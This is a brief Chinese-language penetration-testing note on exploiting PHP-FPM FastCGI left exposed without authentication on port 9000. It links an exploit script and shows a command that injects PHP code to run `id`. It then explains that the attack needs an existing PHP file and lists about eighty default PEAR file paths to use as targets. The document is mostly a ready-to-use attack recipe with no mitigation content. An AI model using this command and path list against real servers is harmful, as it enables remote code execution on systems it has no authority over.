# PHP-FPM Fastcgi 未授权访问

**关注点**PHP-FPM默认监听9000端口，此端口暴露在公网

Exp见 https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

```shell
python3 PHP-FPM\ Fastcgi\ 未授权访问.py 127.0.0.1 /usr/local/lib/php/PEAR.php -c '<?php echo `id`; exit; ?>' 
```

如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。

假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如`/usr/local/lib/php/PEAR.php`。

以下目录都有可能。

```shell
/usr/local/lib/php/pearcmd.php
/usr/local/lib/php/build/run-tests.php
/usr/local/lib/php/build/gen_stub.php
/usr/local/lib/php/PEAR/Validate.php
/usr/local/lib/php/PEAR/RunTest.php
/usr/local/lib/php/PEAR/Downloader.php
/usr/local/lib/php/PEAR/Installer/Role.php
/usr/local/lib/php/PEAR/Installer/Role/Php.php
/usr/local/lib/php/PEAR/Installer/Role/Test.php
/usr/local/lib/php/PEAR/Installer/Role/Ext.php
/usr/local/lib/php/PEAR/Installer/Role/Man.php
/usr/local/lib/php/PEAR/Installer/Role/Cfg.php
/usr/local/lib/php/PEAR/Installer/Role/Data.php
/usr/local/lib/php/PEAR/Installer/Role/Www.php
/usr/local/lib/php/PEAR/Installer/Role/Script.php
/usr/local/lib/php/PEAR/Installer/Role/Doc.php
/usr/local/lib/php/PEAR/Installer/Role/Common.php
/usr/local/lib/php/PEAR/Installer/Role/Src.php
/usr/local/lib/php/PEAR/DependencyDB.php
/usr/local/lib/php/PEAR/Registry.php
/usr/local/lib/php/PEAR/REST/11.php
/usr/local/lib/php/PEAR/REST/10.php
/usr/local/lib/php/PEAR/REST/13.php
/usr/local/lib/php/PEAR/Exception.php
/usr/local/lib/php/PEAR/Config.php
/usr/local/lib/php/PEAR/ErrorStack.php
/usr/local/lib/php/PEAR/Builder.php
/usr/local/lib/php/PEAR/Dependency2.php
/usr/local/lib/php/PEAR/Frontend.php
/usr/local/lib/php/PEAR/PackageFile/Parser/v2.php
/usr/local/lib/php/PEAR/PackageFile/Parser/v1.php
/usr/local/lib/php/PEAR/PackageFile/v2.php
/usr/local/lib/php/PEAR/PackageFile/v1.php
/usr/local/lib/php/PEAR/PackageFile/Generator/v2.php
/usr/local/lib/php/PEAR/PackageFile/Generator/v1.php
/usr/local/lib/php/PEAR/PackageFile/v2/rw.php
/usr/local/lib/php/PEAR/PackageFile/v2/Validator.php
/usr/local/lib/php/PEAR/PackageFile.php
/usr/local/lib/php/PEAR/Validator/PECL.php
/usr/local/lib/php/PEAR/ChannelFile/Parser.php
/usr/local/lib/php/PEAR/Command/Package.php
/usr/local/lib/php/PEAR/Command/Registry.php
/usr/local/lib/php/PEAR/Command/Test.php
/usr/local/lib/php/PEAR/Command/Config.php
/usr/local/lib/php/PEAR/Command/Remote.php
/usr/local/lib/php/PEAR/Command/Mirror.php
/usr/local/lib/php/PEAR/Command/Install.php
/usr/local/lib/php/PEAR/Command/Build.php
/usr/local/lib/php/PEAR/Command/Pickle.php
/usr/local/lib/php/PEAR/Command/Auth.php
/usr/local/lib/php/PEAR/Command/Channels.php
/usr/local/lib/php/PEAR/Command/Common.php
/usr/local/lib/php/PEAR/Downloader/Package.php
/usr/local/lib/php/PEAR/ChannelFile.php
/usr/local/lib/php/PEAR/Proxy.php
/usr/local/lib/php/PEAR/REST.php
/usr/local/lib/php/PEAR/Frontend/CLI.php
/usr/local/lib/php/PEAR/XMLParser.php
/usr/local/lib/php/PEAR/Command.php
/usr/local/lib/php/PEAR/Packager.php
/usr/local/lib/php/PEAR/Common.php
/usr/local/lib/php/PEAR/Task/Unixeol/rw.php
/usr/local/lib/php/PEAR/Task/Replace/rw.php
/usr/local/lib/php/PEAR/Task/Postinstallscript/rw.php
/usr/local/lib/php/PEAR/Task/Replace.php
/usr/local/lib/php/PEAR/Task/Windowseol/rw.php
/usr/local/lib/php/PEAR/Task/Postinstallscript.php
/usr/local/lib/php/PEAR/Task/Unixeol.php
/usr/local/lib/php/PEAR/Task/Common.php
/usr/local/lib/php/PEAR/Task/Windowseol.php
/usr/local/lib/php/PEAR/Installer.php
/usr/local/lib/php/XML/Util.php
/usr/local/lib/php/System.php
/usr/local/lib/php/OS/Guess.php
/usr/local/lib/php/Structures/Graph.php
/usr/local/lib/php/Structures/Graph/Node.php
/usr/local/lib/php/Structures/Graph/Manipulator/AcyclicTest.php
/usr/local/lib/php/Structures/Graph/Manipulator/TopologicalSorter.php
/usr/local/lib/php/doc/XML_Util/examples/example.php
/usr/local/lib/php/doc/XML_Util/examples/example2.php
/usr/local/lib/php/Archive/Tar.php
/usr/local/lib/php/peclcmd.php
/usr/local/lib/php/PEAR.php
```

